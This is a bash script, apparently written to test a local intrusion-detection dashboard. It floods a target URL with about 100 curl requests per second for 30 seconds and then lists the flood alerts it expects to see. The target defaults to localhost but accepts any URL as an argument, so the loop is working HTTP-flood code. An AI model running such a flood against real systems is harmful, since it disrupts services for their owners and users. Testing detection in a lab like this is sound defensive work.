#!/bin/bash

################################################################################
# DoS ATTACK SIMULATION - CONTINUOUS MODE
################################################################################
# Simulates a sustained Denial of Service attack over 30 seconds
# This version keeps connections active for detection
################################################################################

echo "════════════════════════════════════════════════════════════════════════════════"
echo "🌊 DoS ATTACK SIMULATION (Continuous - 30 seconds)"
echo "════════════════════════════════════════════════════════════════════════════════"
echo ""
echo "This script will send continuous HTTP requests for 30 seconds."
echo ""

# Configuration
TARGET="${1:-http://localhost:8000/api/live-capture/status}"
DURATION=30  # Run for 30 seconds
RATE=10      # 10 requests per batch, 100ms delay = ~100 req/sec

echo "Target URL: $TARGET"
echo "Duration: ${DURATION} seconds"
echo "Rate: ~100 requests/second"
echo ""
read -p "Press ENTER to start continuous DoS attack..."
echo ""

SUCCESS=0
FAILED=0
START_TIME=$(date +%s)
END_TIME=$((START_TIME + DURATION))

echo "  [*] Starting continuous HTTP flood attack..."
echo ""

# Continuous attack loop
TOTAL=0
while [ $(date +%s) -lt $END_TIME ]; do
    # Send batch of requests (run in foreground to count properly)
    for i in $(seq 1 $RATE); do
        curl -s -m 0.5 "$TARGET" > /dev/null 2>&1 &
        TOTAL=$((TOTAL + 1))
    done
    
    # Show progress every 5 seconds
    ELAPSED=$(($(date +%s) - START_TIME))
    REMAINING=$((DURATION - ELAPSED))
    if [ $((ELAPSED % 5)) -eq 0 ] && [ $ELAPSED -gt 0 ]; then
        echo "  → Time: ${ELAPSED}s | Sent: $TOTAL requests | Remaining: ${REMAINING}s"
    fi
    
    sleep 0.1  # 100ms delay between batches
done

# Wait for all background requests to complete
wait

TOTAL_TIME=$(($(date +%s) - START_TIME))

echo ""
echo "════════════════════════════════════════════════════════════════════════════════"
echo "✅ DoS SIMULATION COMPLETED"
echo "════════════════════════════════════════════════════════════════════════════════"
echo ""
echo "Results:"
echo "  • Total requests sent: $TOTAL"
echo "  • Duration: ${TOTAL_TIME}s"
if [ $TOTAL_TIME -gt 0 ]; then
    echo "  • Requests per second: $((TOTAL / TOTAL_TIME))"
else
    echo "  • Requests per second: N/A"
fi
echo ""
echo "Expected Detection:"
echo "  • Module 4 should show WiFi HTTP Flood alerts"
echo "  • High volume traffic detected in real-time"
echo "  • Attack should appear within 5 seconds"
echo ""
echo "Check: http://localhost:8000/module4"
echo ""

